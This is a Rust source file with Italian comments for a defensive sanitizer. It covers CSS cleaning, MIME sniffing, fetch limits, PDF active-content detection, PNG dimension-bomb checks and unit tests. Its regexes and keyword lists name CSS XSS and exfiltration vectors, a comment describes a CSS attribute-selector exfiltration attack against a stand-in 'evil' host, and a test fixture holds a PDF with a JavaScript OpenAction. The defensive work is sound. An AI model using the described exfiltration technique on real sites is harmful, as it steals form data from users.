use regex::Regex;
use crate::config::loader::{ResourcePolicy};
use crate::report::report::SanitizationAction;

/// Sanitizzatore dedicato ai fogli di stile CSS (sia inline nei tag <style> che file esterni .css)
pub struct CssSanitizer;

impl CssSanitizer {
    /// Pulisce una stringa CSS rimuovendo vettori di attacco XSS e di esfiltrazione dati.
    pub fn sanitize(css_content: &str) -> String {
        let mut cleaned = css_content.to_string();

        // 1. Neutralizza IE expression()
        // Cerca la parola "expression" seguita da parentesi.
        // Vettore di attacco classico su vecchie versioni di Internet Explorer.
        let re_expression = Regex::new(r"(?i)expression\s*\(.*?\)").unwrap();
        cleaned = re_expression.replace_all(&cleaned, "/* expression rimossa */").to_string();

        // 2. Neutralizza url(javascript:...)
        // Impedisce l'esecuzione di script tramite la proprietà background o content.
        let re_js_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?javascript:.*?['\x22]?\s*\)").unwrap();
        cleaned = re_js_url.replace_all(&cleaned, "url('about:blank')").to_string();

        // 3. Neutralizza @import cross-origin o contenenti javascript
        // Blocca catene di @import esterne che potrebbero caricare stili malevoli a cascata
        // o eseguire javascript mascherato.
        let re_import = Regex::new(r"(?i)@import\s+(?:url\()?\s*['\x22]?(?:http:|https:|javascript:)[^;]+;").unwrap();
        cleaned = re_import.replace_all(&cleaned, "/* @import esterno bloccato */\n").to_string();

        // 4. Previene l'esfiltrazione dati (Data Leakage) tramite background: url(...)
        // Nel tuo scenario, l'attaccante usa input[value^='a'] { background: url('http://evil.../?v=a') }
        // per rubare dati form o cookie riga per riga. Blocchiamo gli URL HTTP/HTTPS esterni nei CSS.
        let re_external_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?(?:http:|https:)[^)]*\)").unwrap();
        cleaned = re_external_url.replace_all(&cleaned, "url('about:blank')").to_string();

        cleaned
    }
}

#[derive(Debug, PartialEq)]
pub enum DetectedType {
    Html,
    Png,
    Pdf,
    Gzip,
    Unknown,
    Xml,
}

pub struct MimeSniffer;

impl MimeSniffer {
    /// Analizza i byte grezzi del contenuto per determinarne la vera natura,
    /// ignorando le dichiarazioni del server o le estensioni del file.
    pub fn sniff(raw_data: &[u8]) -> DetectedType {
        // 1. Controllo Magic Bytes del PNG
        // VERO file binario (se i byte sono puri)
        let png_magic: [u8; 8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

        // PNG letto come Stringa UTF-8 (il byte 0x89 non valido diventa '')
        let png_magic_utf8 = "\u{FFFD}PNG".as_bytes();

        if raw_data.starts_with(&png_magic) || raw_data.starts_with(png_magic_utf8) {
            return DetectedType::Png;
        }

        // 2. Controllo Magic Bytes del PDF
        // I PDF iniziano tipicamente con "%PDF-"
        if raw_data.starts_with(b"%PDF-") {
            return DetectedType::Pdf;
        }

        // 3. Controllo per l'HTML (Sniffing euristico)
        // L'HTML è testuale, quindi spesso inizia con spazi bianchi innocui. Li saltiamo.
        let mut start_idx = 0;
        while start_idx < raw_data.len() && matches!(raw_data[start_idx], 0x09 | 0x0A | 0x0C | 0x0D | 0x20) {
            start_idx += 1;
        }

        let text_data = &raw_data[start_idx..];

        // Estraiamo i primi 15 byte per cercare tag HTML comuni (ignorando maiuscole/minuscole)
        let snippet_len = std::cmp::min(text_data.len(), 15);
        if let Ok(snippet) = std::str::from_utf8(&text_data[..snippet_len]) {
            let upper_snippet = snippet.to_ascii_uppercase();
            // Se troviamo un tag tipico di apertura, è HTML
            if upper_snippet.starts_with("<!DOCTYPE") ||
                upper_snippet.starts_with("<HTML") ||
                upper_snippet.starts_with("<HEAD") ||
                upper_snippet.starts_with("<BODY") ||
                upper_snippet.starts_with("<SCRIPT") ||
                upper_snippet.starts_with("<H1") // Usato spesso nei test
            {
                return DetectedType::Html;
            }
        }

        // 4. controllo per gzip
        // Alcuni server restituiscono contenuti compressi. I file gzip iniziano con 0x1F 0x8B
        if raw_data.starts_with(&[0x1F, 0x8B]) {
            return DetectedType::Gzip;
        }

        // 5. controllo per XML
        // Gli XML iniziano con <?xml
        if raw_data.starts_with(b"<?xml") {
            return DetectedType::Xml;
        }

        // Se non corrisponde a nulla di noto, lo classifichiamo come sconosciuto
        DetectedType::Unknown
    }
}

pub struct ResourceGuard {
    config: ResourcePolicy,       // max_depth, max_resource_size (e un futuro max_requests)
    max_depth: u8,
    max_requests: u32,
    max_bytes: u64,
    requests_made: usize,          // contatore richieste già effettuate
}

#[derive(Debug)]
pub enum RefusalReason {
    // --- controlli generali di rete/risorse ---
    MaxDepthExceeded { current: usize, limit: usize },
    MaxRequestsExceeded { current: usize, limit: usize },
    ResourceTooLarge { size: usize, limit: u64 },
    FetchingDisabled,
    
    // --- controlli su immagini (png) ---
    ImageDimensionsExceeded { width: u32, height: u32, limit: u32 },
    MalformedImageHeader { bytes_available: usize, bytes_needed: usize },
    
    // --- controlli su documenti attivi (pdf) ---
    ActiveContentDetected { content_type: String, details: String },

    // --- controlli DoS Bombs (Gzip e XML) ---
    DecompressionBombDetected { details: String },
    XmlEntityExpansionBomb { details: String },
}

impl ResourceGuard {
    pub fn new(config: ResourcePolicy, max_depth: u8, max_requests: u32, max_bytes: u64) -> Self {
        Self { config,
            max_depth,
            max_requests,
            max_bytes,
            requests_made: 0 }
    }

    /// Chiamata PRIMA di fare la fetch di una sub-risorsa.
    /// current_depth: quanto siamo annidati (0 = risorsa diretta del documento principale)
    pub fn check_before_fetch(&self, current_depth: usize) -> Result<(), RefusalReason> {

        // 1. fetch_resources è disabilitato?
        if self.config.fetch_resources == false {
            return Err(RefusalReason::FetchingDisabled);
        }
        // 2. current_depth supera self.config.max_depth?
        if current_depth as u8 >= self.max_depth {
            return Err(RefusalReason::MaxDepthExceeded {
                current: current_depth,
                limit: self.max_depth as usize,
            });
        }
        // 3. self.requests_made ha già raggiunto un massimo?
        if self.requests_made >= self.max_requests as usize {
            return Err(RefusalReason::MaxRequestsExceeded {
                current: self.requests_made,
                limit: self.max_requests as usize,
            });
        }
        Ok(())

    }

    /// Chiamata DOPO aver scaricato i byte, prima di processarli.
    pub fn check_response_size(&self, byte_len: usize) -> Result<(), RefusalReason> {
        // confronta byte_len con self.config.max_resource_size
        if byte_len as u64 > self.max_bytes {
            return Err(RefusalReason::ResourceTooLarge {
                size: byte_len,
                limit: self.max_bytes,
            });
        }
        Ok(())
    }

    /// Chiamata dopo un fetch riuscito, per aggiornare lo stato interno
    pub fn record_request(&mut self) {
        self.requests_made += 1;
    }
}


pub struct PdfSanitizer;

#[derive(Debug, PartialEq)]
pub enum PdfCheckResult {
    Clean,
    ActiveContentDetected { details: String },
    InvalidFormat,
}

impl PdfSanitizer {
    /// Ispeziona i byte del PDF alla ricerca di codice attivo o trigger automatici
    pub fn check_active_content(raw_data: &[u8]) -> PdfCheckResult {
        if !raw_data.starts_with(b"%PDF-") {
            return PdfCheckResult::InvalidFormat;
        }

        let suspicious_triggers: [&[u8]; 2] = [b"/OpenAction", b"/AA"];
        let suspicious_actions: [&[u8]; 3] = [b"/JavaScript", b"/JS", b"/Launch"];

        let has_trigger = suspicious_triggers.iter().any(|pattern| {
            raw_data.windows(pattern.len()).any(|window| window == *pattern)
        });
        let has_action = suspicious_actions.iter().any(|pattern| {
            raw_data.windows(pattern.len()).any(|window| window == *pattern)
        });

        if has_trigger || has_action {
            PdfCheckResult::ActiveContentDetected {
                details: "Rilevato codice JavaScript / OpenAction nel PDF".to_string(),
            }
        } else {
            PdfCheckResult::Clean
        }
    }
}

pub struct ImageSanitizer;

#[derive(Debug, PartialEq)]
pub enum ImageCheckResult {
    Valid { width: u32, height: u32 },
    DimensionBomb { width: u32, height: u32 },
    InvalidFormat,
}

impl ImageSanitizer {
    pub const MAX_DIMENSION: u32 = 4096; // Max 4096px

    /// Ispeziona i byte di un PNG ed estrae larghezza e altezza senza caricare l'immagine in RAM
    pub fn check_dimensions(bytes: &[u8]) -> ImageCheckResult {
        // Controllo Signature PNG (8 byte) + IHDR header (almeno 24 byte totali)
        if bytes.len() >= 24 && bytes.starts_with(&[0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) {
            let width = u32::from_be_bytes(bytes[16..20].try_into().unwrap());
            let height = u32::from_be_bytes(bytes[20..24].try_into().unwrap());

            if width > Self::MAX_DIMENSION || height > Self::MAX_DIMENSION {
                ImageCheckResult::DimensionBomb { width, height }
            } else {
                ImageCheckResult::Valid { width, height }
            }
        } else {
            ImageCheckResult::InvalidFormat
        }
    }
}


// in resource_rules.rs, o in report.rs se preferisci tenerlo centralizzato
impl From<RefusalReason> for SanitizationAction {
    fn from(reason: RefusalReason) -> Self {
        let (rule_fired, description) = match reason {
            RefusalReason::FetchingDisabled =>
                ("FETCH_DISABLED".to_string(), "Fetch delle sub-risorse disabilitato dalla policy".to_string()),
            RefusalReason::MaxDepthExceeded { current, limit } =>
                ("MAX_DEPTH_EXCEEDED".to_string(), format!("Profondità {} supera il limite {}", current, limit)),
            RefusalReason::MaxRequestsExceeded { current, limit } =>
                ("MAX_REQUESTS_EXCEEDED".to_string(), format!("{} richieste, limite {}", current, limit)),
            RefusalReason::ResourceTooLarge { size, limit } =>
                ("RESOURCE_TOO_LARGE".to_string(), format!("{} byte, limite {}", size, limit)),
            RefusalReason::ImageDimensionsExceeded { width, height, limit } =>
                ("IMAGE_DIMENSIONS_EXCEEDED".to_string(), format!("{}x{} pixel, limite {}", width, height, limit)),
            RefusalReason::MalformedImageHeader { bytes_available, bytes_needed } =>
                ("MALFORMED_IMAGE_HEADER".to_string(), format!("{} byte disponibili, ne servivano {}", bytes_available, bytes_needed)),
            RefusalReason::ActiveContentDetected { content_type, details } =>
                ("ACTIVE_CONTENT_DETECTED".to_string(), format!("{}: {}", content_type, details)),
            
            // Nuove varianti:
            RefusalReason::DecompressionBombDetected { details } =>
                ("DECOMPRESSION_BOMB_DETECTED".to_string(), details),
            RefusalReason::XmlEntityExpansionBomb { details } =>
                ("XML_ENTITY_EXPANSION_BOMB".to_string(), details),
        };

        SanitizationAction {
            rule_fired,
            location: "resource-fetch".to_string(),
            original_fragment: description,
            replacement: "Rifiutato".to_string(),
        }
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_resource_guard_fetch_disabled() {
        let config = ResourcePolicy {
            fetch_resources: false,
        };
        // Aggiungiamo i limiti fittizi: depth=3, requests=20, bytes=1024
        let guard = ResourceGuard::new(config, 3, 20, 1024);

        assert!(guard.check_before_fetch(0).is_err()); // fetch disabilitato
    }

    #[test]
    fn test_resource_guard_depth_limit() {
        let config = ResourcePolicy {
            fetch_resources: true,
        };
        // Impostiamo max_depth a 3
        let guard = ResourceGuard::new(config, 3, 20, 1024);

        assert!(guard.check_before_fetch(0).is_ok());
        assert!(guard.check_before_fetch(2).is_ok());
        assert!(guard.check_before_fetch(3).is_err()); // superato il limite
    }

    #[test]
    fn test_resource_guard_size_limit() {
        let config = ResourcePolicy {
            fetch_resources: true,
        };
        // Impostiamo max_bytes a 1024
        let guard = ResourceGuard::new(config, 3, 20, 1024);

        assert!(guard.check_response_size(512).is_ok());
        assert!(guard.check_response_size(1024).is_ok());
        assert!(guard.check_response_size(2048).is_err()); // superato il limite
    }

    #[test]
    fn test_resource_guard_request_limit() {
        let config = ResourcePolicy {
            fetch_resources: true,
        };
        // Impostiamo max_requests a 20
        let mut guard = ResourceGuard::new(config, 3, 20, 1024);

        for _ in 0..20 {
            guard.record_request();
        }
        assert!(guard.check_before_fetch(0).is_err()); // superato il limite di richieste
    }

    #[test]
    fn test_png_dimension_check() {
        let valid_png: [u8; 24] = [
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // Magic bytes
            0x00, 0x00, 0x00, 0x0D, // Length of IHDR chunk
            0x49, 0x48, 0x44, 0x52, // "IHDR"
            0x00, 0x00, 0x01, 0x00, // Width: 256
            0x00, 0x00, 0x01, 0x00, // Height: 256
        ];
        assert_eq!(
            ImageSanitizer::check_dimensions(&valid_png),
            ImageCheckResult::Valid { width: 256, height: 256 }
        );

        let bomb_png: [u8; 24] = [
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // Magic bytes
            0x00, 0x00, 0x00, 0x0D, // Length of IHDR chunk
            0x49, 0x48, 0x44, 0x52, // "IHDR"
            0x00, 0x00, 0x10, 0x01, // Width: 4097 (supera il limite di 4096)
            0x00, 0x00, 0x10, 0x00, // Height: 4096
        ];
        assert_eq!(
            ImageSanitizer::check_dimensions(&bomb_png),
            ImageCheckResult::DimensionBomb { width: 4097, height: 4096 }
        );
    }

    #[test]
    fn test_pdf_active_content_check() {
        let pdf_with_js = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 5 0 R >>\nendobj\n5 0 obj\n<< /S /JavaScript /JS (app.alert('ciao');) >>\nendobj\n";
        assert_ne!(PdfSanitizer::check_active_content(pdf_with_js), PdfCheckResult::Clean);

        let pdf_without_js = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n";
        assert_eq!(PdfSanitizer::check_active_content(pdf_without_js), PdfCheckResult::Clean);
    }
}